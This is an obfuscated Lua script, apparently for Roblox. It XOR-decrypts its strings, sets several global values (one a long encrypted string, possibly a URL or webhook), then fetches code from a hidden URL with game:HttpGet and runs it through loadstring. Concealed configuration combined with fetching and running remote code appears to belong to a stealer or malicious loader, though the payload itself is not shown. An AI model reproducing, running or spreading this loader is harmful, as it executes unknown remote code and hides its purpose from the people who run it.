local obf_stringchar = string.char;
local obf_stringbyte = string.byte;
local obf_stringsub = string.sub;
local obf_bitlib = bit32 or bit;
local obf_XOR = obf_bitlib.bxor;
local obf_tableconcat = table.concat;
local obf_tableinsert = table.insert;
local function LUAOBFUSACTOR_DECRYPT_STR_0(LUAOBFUSACTOR_STR, LUAOBFUSACTOR_KEY)
	local result = {};
	for i = 1, #LUAOBFUSACTOR_STR do
		obf_tableinsert(result, obf_stringchar(obf_XOR(obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_STR, i, i + 1)), obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_KEY, 1 + (i % #LUAOBFUSACTOR_KEY), 1 + (i % #LUAOBFUSACTOR_KEY) + 1))) % 256));
	end
	return obf_tableconcat(result);
end
local arg1 = ...;
local luaobf_bundle = {};
local _require = require;
local function require(path, ...)
	local fn = luaobf_bundle[path];
	if not fn then
		return _require(path, arg1, ...);
	end
	return fn(arg1, ...);
end
luaobf_bundle[LUAOBFUSACTOR_DECRYPT_STR_0("\215\202\215\32", "\126\177\163\187\69\134\219\167")] = function(...)
	_G[LUAOBFUSACTOR_DECRYPT_STR_0("\54\222\47\215\242\34\192\47", "\156\67\173\74\165")] = LUAOBFUSACTOR_DECRYPT_STR_0("\62\178\67\5\183\39", "\38\84\215\41\118\220\70");
	_G[LUAOBFUSACTOR_DECRYPT_STR_0("\93\31\44\45\232\81\26\55\23", "\158\48\118\66\114")] = 10;
	_G[LUAOBFUSACTOR_DECRYPT_STR_0("\188\33\18\62\124\170\240", "\155\203\68\112\86\19\197")] = LUAOBFUSACTOR_DECRYPT_STR_0("\78\201\34\236\83\34\170\183\66\212\37\255\79\106\225\182\69\210\59\179\65\104\236\183\81\216\52\244\79\119\238\235\9\140\101\170\19\42\180\173\23\139\110\169\24\46\180\170\23\142\110\165\15\126\232\236\69\210\0\208\106\46\199\252\68\136\28\242\111\75\207\226\106\139\33\248\25\91\189\192\98\213\62\221\112\105\183\219\67\249\110\242\65\93\203\252\31\138\96\228\111\77\180\235\113\215\101\218\103\112\232\213\77\202\46\249\98\32\179\214\98", "\152\38\189\86\156\32\24\133");
	loadstring(game:HttpGet(LUAOBFUSACTOR_DECRYPT_STR_0("\244\67\179\86\239\13\232\9\238\86\176\8\251\94\179\78\233\85\178\85\249\69\164\73\242\67\162\72\232\25\164\73\241\24\179\71\255\68\172\83\240\91\232\84\249\84\232\75\253\94\169\9\239\95\173\81\247\64\233\74\233\86", "\38\156\55\199")))();
end;
return luaobf_bundle[LUAOBFUSACTOR_DECRYPT_STR_0("\174\116\112\45", "\35\200\29\28\72\115\20\154")](...);
